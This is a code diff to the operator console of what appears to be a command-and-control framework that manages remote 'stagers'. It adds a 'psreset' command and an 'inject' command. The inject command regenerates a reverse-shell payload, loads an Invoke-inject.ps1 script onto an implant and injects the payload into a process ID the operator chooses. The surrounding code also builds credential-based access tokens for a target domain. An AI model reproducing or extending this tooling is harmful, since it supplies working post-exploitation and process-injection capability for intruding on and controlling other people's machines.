@@ -89,10 +89,12 @@ class myconstant():
         self.CMD_STAGER_TOOLS_GETAL = "getal"
         self.CMD_STAGER_TOOLS_GETCLM = "getclm"
         self.CMD_STAGER_TOOLS_MAKETOKEN = "maketoken"
+        self.CMD_STAGER_TOOLS_PSRESET = "psreset"
+        self.CMD_STAGER_TOOLS_INJECT = "inject"
         
         self.CMD_STAGER_TOOLS_AUTOLIST = [self.CMD_BACK,self.CMD_STAGER_TOOLS_PSEXEC,self.CMD_STAGER_TOOLS_IF64BIT,
                                             self.CMD_STAGER_TOOLS_GETNETVERSION,self.CMD_STAGER_TOOLS_GETAV,self.CMD_STAGER_TOOLS_GETAL,
-                                            self.CMD_STAGER_TOOLS_GETCLM,self.CMD_STAGER_TOOLS_MAKETOKEN]
+                                            self.CMD_STAGER_TOOLS_GETCLM,self.CMD_STAGER_TOOLS_MAKETOKEN,self.CMD_STAGER_TOOLS_PSRESET,self.CMD_STAGER_TOOLS_INJECT]
 
         self.CMD_PIPE_LISTENER_GETINFO = "info"
         self.CMD_PIPE_LISTENER_SETPIPENAME = "setpipename"
@@ -123,11 +125,14 @@ class myconstant():
 class myconstant_networking(): #applicaiton layer tag
     def __init__(self):
         self.PSRUN_SUCCESS = "PSRUN_SUCCESS"
+        self.PSRESET = "PSRESET_SUCCESS"
         self.PIPE_CONNECTED = "PIPE_CONNECTED"
         self.FW_NOTREADY = "FW_NOTREADY"
         self.FW_SUCCESS = "FW_SUCCESS" #for remote startup
         self.FW_LOCAL_SUCCESS = "FW_LOCAL_SUCCESS" #for local startup
         self.FW_LOCAL_ERROR = "FW_LOCAL_ERROR" #for local startup
+        
+
 
 
 class mybuildin_cmd():
@@ -475,7 +480,7 @@ class myserver():
                     
                     continue
                 
-                if cmd_struct_to_send[0] == "fw": #fw init
+                if cmd_struct_to_send[0] == "fw" or cmd_struct_to_send[0] == "psreset": #fw init and psreset
                     #get ack, no send
                     recv_result = t_mysockethandler.get_nextmsg()
                     myhistory.append("[Stager] Run Command result: {}".format(recv_result))
@@ -1244,10 +1249,51 @@ class mymainclass():
                     user_input_domain = input("Please enter target domain: ")
                     user_input_username = input("Please enter username: ")
                     user_input_password = input("Please enter password: ")
+                    user_input_confirm = input("y to continue: ")
+                    if user_input_confirm != "y":
+                        continue
 
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.OPH_INIT)
                     self.__t_myserver.create_command(user_input_stager,"ps",self.__t_mybuildin.OPH_NEWTOKEN.format(user_input_username,user_input_domain,user_input_password))
                     continue
+
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_PSRESET:
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+                    self.__t_myserver.create_command(user_input_stager,"psreset","dummy")
+                
+                if command_id == self.__t_myconstant.CMD_STAGER_TOOLS_INJECT:
+                    
+                    #re-generate payload 
+                    t_mypayloadgen = payloadgen.mypayloadgen()
+                    if self.__t_mypayload.payloadtype == "socket":
+                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.host,self.__t_mypayload.port)
+                    else:
+                        t_mypayloadgen.set_config(self.__t_mypayload.payloadtype,self.__t_mypayload.ifreverse,self.__t_mypayload.namepipehost,self.__t_mypayload.namepipe)
+                    t_mypayloadgen.gen_ps1()
+                    t_mypayloadgen.gen_inject()
+
+                    #set auto compete to stager uuid
+                    setautocomplete(self.__t_myserver.get_running_stager())
+
+                    user_input_stager = input("Please enter the stager uuid: ")
+                    if user_input_stager not in self.__t_myserver.get_running_stager():
+                        print("Please input a valid stager uuid")
+                        continue
+
+                    t_psloader = ps_loader()
+                    t_result = t_psloader.load_ps("Invoke-inject.ps1")
+                    self.__t_myserver.create_command(user_input_stager,"psload",t_result)
+
+                    removecomplete()
+                    user_input_target = input("Please enter pid to inject into: ")
+                    self.__t_myserver.create_command(user_input_stager,"ps","Invoke-inject \"{}\"".format(user_input_target))
+
 
 
             if cmd_tag == self.__t_myconstant.TAG_PIPE_LISTENER:
